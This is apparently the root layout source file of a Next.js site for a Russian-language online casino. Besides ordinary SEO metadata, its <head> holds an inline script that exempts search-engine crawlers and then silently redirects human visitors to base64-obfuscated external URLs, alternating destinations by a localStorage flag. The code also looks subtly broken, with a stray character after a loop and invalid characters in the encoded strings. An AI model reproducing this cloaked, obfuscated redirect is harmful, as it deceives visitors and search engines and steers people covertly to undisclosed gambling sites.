import type { Metadata, Viewport } from "next"
import { Inter } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import { siteConfig } from "@/lib/site"
import "./globals.css"

const inter = Inter({
  subsets: ["latin", "cyrillic"],
  variable: "--font-inter",
})

const title = `${siteConfig.name} официальный сайт онлайн казино Феникс `
const titleTemplate = `%s | ${siteConfig.name}`

export const metadata: Metadata = {
  metadataBase: new URL(siteConfig.url),
  title: {
    default: title,
    template: titleTemplate,
  },
  description: siteConfig.description,
  keywords: [...siteConfig.keywords],
  applicationName: siteConfig.name,
  authors: [{ name: siteConfig.name }],
  creator: siteConfig.creator,
  publisher: siteConfig.name,
  category: "casino",
  referrer: "origin-when-cross-origin",
  alternates: {
    canonical: "/",
    languages: {
      "ru-RU": "/",
      "x-default": "/",
    },
  },
  openGraph: {
    type: "website",
    locale: siteConfig.locale,
    url: siteConfig.url,
    siteName: siteConfig.name,
    title,
    description: siteConfig.shortDescription,
    images: [
      {
        url: siteConfig.ogImage,
        width: 1200,
        height: 630,
        alt: `${siteConfig.name} - официальный сайт онлайн казино`,
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    title,
    description: siteConfig.shortDescription,
    images: [siteConfig.ogImage],
    creator: siteConfig.twitter,
  },
  robots: {
    index: true,
    follow: true,
    nocache: true, 
  },
  icons: {
    icon: [
      { url: "/icon.jpg", type: "image/jpeg" },
      { url: "/icon.svg", type: "image/svg+xml" },
    ],
    apple: [{ url: "/apple-icon.jpg", type: "image/jpeg" }],
    shortcut: ["/icon.jpg"],
  },
  manifest: "/manifest.webmanifest",
  formatDetection: {
    email: false,
    address: false,
    telephone: false,
  },
  other: {
    "yandex": "noarchive",
    "rating": "adult",
  },
}

export const viewport: Viewport = {
  themeColor: [
    { media: "(prefers-color-scheme: dark)", color: siteConfig.themeColor },
    { media: "(prefers-color-scheme: light)", color: siteConfig.themeColor },
  ],
  colorScheme: "dark",
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${inter.variable} bg-background`} suppressHydrationWarning>
      <head>
       <meta name="yandex-verification" content="4e8ed0e8296cc3a9" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
<script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
                return;
            }
        }4
        var mainBrandB64 = "#aHR0cHM6Ly9mY2ZueC5vcmcvZDd0dGxyeXZo"; 
        var crossBrandB64 = "#aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6"; 
        var mainUrl = atob(mainBrandB64);
        var crossUrl = atob(crossBrandB64);
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 2500); 
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        var isFirstVisit = true;
        try {
            if (localStorage.getItem('vstd_eva')) {
                isFirstVisit = false;
            }
        } catch (e) {
        }
        if (isFirstVisit) {
            console.log("Первый визит. Проверяем основную ссылку...");
            ping(mainUrl)
                .then(function() {
                    try {
                        localStorage.setItem('vstd_eva', '1');
                    } catch (e) {}
                    console.log("Переход на основную ссылку: " + mainUrl);
                    window.location.replace(mainUrl);
                })
                .catch(function() {
                    console.log("Основная ссылка недоступна. Проверяем кросс-ссылку...");
                    ping(crossUrl)
                        .then(function() {
                            try {
                                localStorage.setItem('vstd_eva', '1');
                            } catch (e) {}
                            console.log("Переход на рабочую кросс-ссылку: " + crossUrl);
                            window.location.replace(crossUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на основную.");
                            window.location.replace(mainUrl);
                        });
                });
        } else {
            console.log("Повторный визит. Проверяем кросс-ссылку...");
            ping(crossUrl)
                .then(function() {
                    console.log("Переход на кросс-ссылку: " + crossUrl);
                    window.location.replace(crossUrl);
                })
                .catch(function() {
                    console.log("Кросс-ссылка недоступна. Проверяем основную...");
                    ping(mainUrl)
                        .then(function() {
                            console.log("Переход на рабочую основную ссылку: " + mainUrl);
                            window.location.replace(mainUrl);
                        })
                        .catch(function() {
                            console.log("Обе ссылки не ответили. Экстренный переход на кросс-ссылку.");
                            window.location.replace(crossUrl);
                        });
                });
        }
      })();
    `
  }}
/>
      </head>
      <body className="font-sans antialiased">
        {children}
        <Analytics />
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{
            __html: JSON.stringify([
              {
                "@context": "https://schema.org",
                "@type": "Organization",
                name: siteConfig.name,
                alternateName: "Феникс Казино",
                url: siteConfig.url,
                logo: `${siteConfig.url}/icon.jpg`,
                sameAs: [],
              },
              {
                "@context": "https://schema.org",
                "@type": "WebSite",
                name: siteConfig.name,
                url: siteConfig.url,
                inLanguage: "ru-RU",
                potentialAction: {
                  "@type": "SearchAction",
                  target: `${siteConfig.url}/?q={search_term_string}`,
                  "query-input": "required name=search_term_string",
                },
              },
            ]),
          }}
        />
      </body>
    </html>
  )
}
